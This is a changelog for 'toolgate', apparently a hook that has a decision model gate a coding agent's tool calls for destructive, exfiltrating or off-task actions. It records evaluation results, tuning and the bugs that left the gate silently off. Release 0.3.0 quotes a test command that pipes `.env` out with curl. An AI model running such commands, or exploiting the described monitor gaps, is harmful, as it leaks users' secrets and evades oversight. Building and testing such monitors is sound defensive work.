# Changelog

## 0.5.3 — the hook must prove it is on
- Found on the second real install: `doctor` passed every check while the hook was not running at all, because everything it checked ran from the user's shell — the one environment Claude Code does not launch hooks from.
- `toolgate init` now installs the hook into `~/.claude/settings.json` itself (backup kept, existing hooks preserved, idempotent) instead of printing a snippet to paste. `toolgate install` refreshes it; `init --print` still prints the snippet.
- The installed command names `node` and toolgate's `cli.js` by absolute path. The previous absolute-path bin still needed `node` on PATH via its shebang; under `env -i` it failed with "node: No such file or directory".
- `doctor` now also checks the key file exists, that a toolgate hook is present in settings and is the current command, and runs the installed command exactly as Claude Code would (`sh -c`, JSON on stdin) under a minimal environment — system PATH, no shell exports, no keys, throwaway mock policy — and requires a decision back. A stale bare `toolgate hook` entry fails this test, as it should.
- A missing API key was an "internal error" that turned every gated call into an `ask` — even ones a static rule would have settled. It is now "decision model unavailable": static rules still run first, then `fail_mode` decides, so the default `passthrough` shows `[toolgate] NOT gating: … no API key found` and defers to Claude Code's normal flow, as the 0.5.2 notes already claimed.
- Allowed calls no longer emit a `[toolgate] …` line on every gated tool call; asks, denies, and fail-mode passthroughs still do. `show_allows: true` restores the old behavior.
- Docs pass: the opening line said Jev was reached "via Vercel AI Gateway" — direct API has been the default since 0.5.1 when `TYPESAFE_API_KEY` is set. Task-context cap is 4 000 chars (the README still said 1 200, the pre-0.4.1 value). Context questions are four, not two. Roadmap and credits brought up to date. npm `homepage`, `bugs`, and keywords added.
- New this release, not fixed: a first-ever call from a fresh project to its own API with a credential in the command scores as exfiltration and is denied (observed live: a Claude Code session posting to `api.typesafe.ai`). Jev's criteria say "a host the project does not already use", which a brand-new project cannot satisfy. `trusted_hosts` is on the roadmap; until then run such calls yourself, or add a narrowly scoped static rule.

## 0.5.2 — the hook must never be silently off
- Found on the first real install: a GUI-launched Claude Code has neither npm's global bin on PATH nor `.zshrc` exports, so the hook either was not found or ran without a key and passed everything through silently.
- `init` now writes the settings snippet with the binary's absolute path, and saves the API key to `~/.toolgate/env` (0600). Both the CLI and the hook load that file when the variable is not already set.
- A fail-mode passthrough (model unreachable, no key) now emits a `systemMessage` — "[toolgate] NOT gating: …" — so the user sees it in Claude Code. The decision still defers to the normal permission flow.

## 0.5.1 — usability pass before npm
- First direct-vs-Gateway measurement, same command: direct 1208 ms (destructive 0.96), Gateway 1324 ms (destructive 0.88). Gateway overhead ~100 ms. The probability differs because the direct path folds criteria into the noul instructions.
- Direct TypeSafe backend (`TYPESAFE_API_KEY`, `api.typesafe.ai/v1/systemone`, no SDK). Boolean questions map to `noul`; criteria are folded into the instructions since noul takes instructions only.
- `backend.provider: auto` (new default): typesafe if `TYPESAFE_API_KEY` is set, else gateway if `AI_GATEWAY_API_KEY` is set, else a clear error naming both. `model: auto` picks each provider's default.
- `toolgate init` now verifies itself: keys found, backend chosen, one real test decision with latency — before printing the settings snippet. `toolgate doctor` repeats the check.
- `toolgate audit --stats`: decision count, verdict and source breakdown, model latency p50/p90/max, tools, recent asks/denies.

## 0.5.0 — first release
- No code changes from 0.4.1. This version marks the first evaluated state: set 2 corrected-input rerun 20/20, set 3 (10 matched pairs, held-out) 17/20 with zero permissive errors. See docs/challenge-analysis-2026-09-18-b.md.
- Known defect carried into the release: "ask me before X" instructions score as constraint violations (deny instead of ask). Wording fix pending a fresh evaluation set.
- First npm publish as `@riskaverse/toolgate`.

## 0.4.1 — task-context truncation (evaluation-invalidating bug)
- `lastUserPrompt()` kept only 1,200 characters of the transcript's last user prompt. With a long task (challenge-set-2's ~1.1k fixture preamble), the actual instructions were cut off silently and the model was scored on input it never saw. Budget raised to 4,000; truncation is now flagged as `current_task_truncated` in the state and, like truncated tool input, caps the verdict at `ask`.
- `toolgate check` now prints the exact redacted `state` sent to the model. The challenge runner records it per case and refuses to score any case whose task context was truncated or missing.
- Challenge runner reports complete-pair accuracy for sets with matched pairs.
- challenge-set-3 (10 matched pairs) frozen; set 2 to be rerun on unchanged v0.4 wording as a corrected-input rerun.
- The bug and the required corrections were found by a sixth review by ChatGPT (GPT-6 Astra), run by Jaz, which also authored set 3. The set-2 analysis doc is retracted in part.

## 0.4.0 — constraints and reserved choices
- Two new context questions, designed from challenge-set-1's failures (all seven misses were scope violations the capability axes correctly scored as not inherently dangerous): `violates_constraint` (contradicts an explicit "only"/"do not"/read-only/target restriction in the task) and `unresolved_choice` (commits to a decision the task reserved for the user).
- Policy: both are never softened by authorization. `violates_constraint` can reach `deny`; `unresolved_choice` is capped at `ask`.
- challenge-set-2 frozen before this change; both sets now carry categories (control / constraint / unresolved / secret-policy) and the runner reports per-category matches.
- Diagnosis refinement (policy could allow with authorized 0.10 if nothing crossed ask) and the two floors' semantics from a fifth review by ChatGPT (GPT-6 Astra), run by Jaz, which also authored both challenge sets.

## 0.3.2
- Authorization now softens **per axis** and the strictest axis wins. Previously the `secret_exposure` floor only applied when it was the highest-scoring axis, so 0.98 destructive / 0.97 secret / 0.95 authorized produced `ask` instead of `deny`. Explanation names the axis that decided the verdict.
- Docs correction: run 2's "authorized leak" case never engaged softening (0.84 < the then-0.9 threshold); the floor is now exercised by replaying those scores in a unit test.
- Both from a fourth review by ChatGPT (GPT-6 Astra), run by Jaz, which also endorsed the 0.8 threshold on the run-2 evidence.

## 0.3.1
- Default `thresholds.authorized` 0.9 → 0.8. Across two live runs, explicitly requested actions scored 0.84–0.89 and unrelated ones 0.03–0.18; 0.9 was never reached, so the mitigator never fired. See docs/live-results-2026-09-18-b.md.

## 0.3.0
- New `secret_exposure` risk question (prints, persists, or commits credential values; ordinary authenticated use stays low). Authorization never softens it — a task asking for a leak does not make the leak fine.
- Latency split: `warm()` on backends; `latencyMs` is now the request alone and `setupMs` (SDK import) is reported separately in decisions and the audit log. Earlier reported latencies included the import.
- `scripts/live-check.sh` rewritten around the cases where authorization changes the verdict: explicit permission for the exact action, a general task that does not authorize it, right operation / wrong target, and an authorized action bundled with an unauthorized one (`vercel deploy --prod && curl -d @.env …`), plus a secret-exposure set.
- The bundled-command gap, the `secret_exposure` wording, the no-softening floor, and the latency-measurement critique came from a third review by ChatGPT (GPT-6 Astra), run by Jaz.

## 0.2.3
- First live Jev results (via Vercel AI Gateway): benign commands 0.01–0.02, `git push origin main` 0.16–0.19, `git push --force` 0.88 → deny. Observed latency ~0.85–1.0 s per call through the Gateway; first call timed out at 2.5 s. Default `timeout_ms` raised 2500 → 5000.
- README: latency claim corrected to what we measured; credits section.

## 0.2.2
- `toolgate check --task <text>` supplies task context so `off_task` and `authorized` are exercised.
- `scripts/live-check.sh`: one-line-per-command live smoke test against real Jev.

## 0.2.1
- Softening now requires task context, a real (unrounded) `authorized` answer at/above the threshold, and `off_task` below the ask threshold — conflicting judgments stay at `ask`.
- Missing authorization no longer passes a threshold of 0 (and no longer prints `NaN`).
- Default `thresholds.authorized` raised 0.5 → 0.9 until tuned on labeled data.
- Edge cases (missing-context × zero threshold, rounding before comparison, off_task/authorized conflict), the replacement check, and the 0.9 threshold recommendation came from an independent review by ChatGPT (GPT-6 Astra), run by Jaz.

## 0.2.0 — capability is not harm
- New `authorized` mitigator question; deny → ask and ask → allow when the stated task explicitly calls for the action. Nothing softens without task context.
- `exfiltration` no longer counts pushes to the project's own remote or deploys with its own tooling.
- Truncated input can never be allowed outright.
- Secrets redacted from state before it leaves the machine, not only in the audit log.
- The risk-vs-authorization critique that drove this release ("a 95% probability that something uploads data is not a 95% probability that it is harmful") came from an independent review by ChatGPT (GPT-6 Astra), run by Jaz.

## 0.1.2
- Lazy-load the AI SDK: static-rule and passthrough paths ~600 ms → ~90 ms.
- Linear-time `rm` rule on multi-megabyte input; stderr signal on fail-mode; TTY guard.

## 0.1.1
- Hardening after three independent audits: ReDoS fix, no per-project policy discovery, raw-value rule matching, `undefined`-free state, anchored matchers, merged (not replaced) user rules/questions, audit file permissions and redaction, bare-bin settings snippet (`npx toolgate` resolves to an unrelated package).

## 0.1.0
- Initial release: Claude Code PreToolUse hook backed by TypeSafe Jev via Vercel AI Gateway.
